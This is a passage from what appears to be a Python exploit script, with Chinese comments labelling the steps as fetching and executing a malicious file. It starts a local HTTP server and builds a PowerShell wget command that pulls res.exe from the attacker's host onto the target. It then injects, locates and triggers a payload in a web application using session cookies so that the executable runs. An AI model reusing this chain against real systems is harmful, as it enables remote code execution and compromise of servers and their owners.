...
if __name__ == "__main__":
    ...
    # 啟動伺服器
    server_process = start_http_server(port=7778, directory=".")

    # 1. 抓取惡意檔案
    get_file = f"powershell wget {LOCAL_IP}:7778/res.exe -O C:/logs/res.exe"
    print("Lhost",get_file)
    ...
    # 2. 執行惡意檔案
    payload = create_payload("C:/logs/res.exe")
    inject_payload(TARGET_URL, payload, cookies=COOKIES)
    product_id = get_id(TARGET_URL, cookies=COOKIES)
    trigger_payload(TARGET_URL, product_id, cookies=COOKIES)
